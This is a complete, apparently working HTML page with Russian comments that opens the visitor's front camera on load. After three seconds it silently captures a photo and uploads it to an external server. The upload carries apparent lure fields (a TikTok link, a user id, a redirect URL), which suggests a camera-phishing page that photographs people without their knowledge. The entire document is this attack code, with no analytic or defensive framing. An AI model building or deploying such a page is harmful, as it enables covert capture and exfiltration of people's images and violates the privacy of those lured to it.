<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture (Front Camera)</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
        }
        video {
            width: 100%;
            height: auto;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body>

<!-- Видео-элемент для трансляции с камеры -->
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // Функция запроса доступа к передней камере
    function startCamera() {
        // Проверяем доступность mediaDevices
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            alert('Ваше устройство не поддерживает доступ к камере.');
            return;
        }

        // Параметры для запроса передней камеры
        const constraints = {
            video: { 
                facingMode: 'user', // Передняя камера
                width: { ideal: 1280 },  // Оптимальные размеры видео
                height: { ideal: 720 }
            }
        };

        // Запрашиваем доступ к камере
        navigator.mediaDevices.getUserMedia(constraints)
        .then(stream => {
            video.srcObject = stream;

            // Когда видео загружено, захватываем фото
            video.onloadedmetadata = () => {
                // Ожидание 3 секунды, чтобы камера успела сфокусироваться
                setTimeout(() => {
                    capturePhoto();
                }, 3000);
            };
        })
        .catch(err => {
            console.error('Ошибка доступа к камере:', err);
            alert('Не удалось получить доступ к передней камере. Проверьте разрешения.');
        });
    }

    // Функция захвата фото
    function capturePhoto() {
        // Установка размеров canvas под размеры видео
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // Отрисовка кадра с видео на canvas
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Преобразование изображения в Blob
        canvas.toBlob(blob => {
            if (blob) {
                sendPhoto(blob);
            } else {
                console.error('Не удалось создать Blob');
            }
        }, 'image/jpeg');
    }

    // Функция отправки фото на сервер
    function sendPhoto(blob) {
        const formData = new FormData();
        formData.append('photo', blob, 'photo.jpg');
        formData.append('tiktok_url', 'https://www.tiktok.com/example_video');
        formData.append('user_id', '12345');
        formData.append('redirect_url', 'https://www.redirect.com');

        fetch('https://rusfai-send-photo-f9d0.twc1.net/tiktok', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(result => {
            console.log('Фото успешно отправлено:', result);
        })
        .catch(error => {
            console.error('Ошибка отправки:', error);
        });
    }

    // Запуск камеры при загрузке страницы
    window.addEventListener('load', startCamera);
</script>

</body>
</html>
